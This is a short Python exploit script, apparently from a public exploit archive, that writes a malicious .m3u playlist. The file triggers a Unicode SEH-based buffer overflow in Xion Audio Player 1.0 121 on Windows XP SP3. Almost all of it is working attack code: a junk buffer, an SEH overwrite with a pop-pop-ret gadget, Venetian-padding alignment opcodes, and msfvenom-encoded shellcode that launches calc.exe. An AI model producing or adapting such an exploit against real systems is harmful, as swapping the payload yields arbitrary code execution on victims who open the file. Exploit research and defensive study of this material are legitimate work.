# Exploit for Xion Audio Player 1.0 121 - Unicode exploit
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.m3u", "wb")

junk = "A" * 270
nseh = "\x61\x62"      
seh  = "\x15\x45"                        # 0x00450015  : pop edi # pop esi # ret xion.exe

alignment  = "\x44"                      # First "D"
alignment += "\x6e"                      # Venetian Padding
alignment += "\x55"                      # push EBP   
alignment += "\x6e"                      # Venetian Padding
alignment += "\x58"                      # pop EAX
alignment += "\x6e"                      # Venetian Padding
alignment += "\x05\x14\x11"              # add eax,0x11001400  \
alignment += "\x6e"                      # Venetian Padding     |> +100
alignment += "\x2d\x13\x11"              # sub eax,0x11001300  /
alignment += "\x6e"                      # Venetian Padding

jump  = "\x50"                           # push EAX
jump += "\x6e"                           # Venetian Padding
jump += "\xc2"                           # RETN

padding = "D" * 107

# msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_mixed BufferRegister=EAX

shellcode_calc = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBKLyXu2IpkPm0c0E9ZELqy0rDDK20P0TKB2ZltKqBKddKsBKxJogGMznFmakOdlMl1QqlKRLlo0eqfozmza8Ggr8rNrQG2kNrjptK0JoLBkpLLQ0xWspHJaVqpQtKR9O0zaFs2k19jxK3oJMy2kp4DKM1Z6LqkOFLEqvoZmZauwmhYPCEzVIsamL8Mk3MmT0uiTb8RkaHo4M1yCC6DKZlnktKaHkl9q6sDKlDtKzahPriq4LdLdaKQKQQoi1JpQyoiP1OqONzBkmBJKdMQMQZzaDMTEdripIpKPr0QXNQbk0ocWIoj5ukXp6UdbB6bHw6eEwMUMKO6umljfqljjE0IkYPrUlEgKa7JsT2rO1ZkPocYo7eS3Oq2LPcNNRERX0ekPAA"

junk2 = "E" * (5000-len(junk+nseh+seh+alignment+jump+padding+shellcode_calc))

buffer  = junk 
buffer += nseh
buffer += seh
buffer += alignment
buffer += jump
buffer += padding
buffer += shellcode_calc
buffer += junk2

file.write(buffer)
file.close()
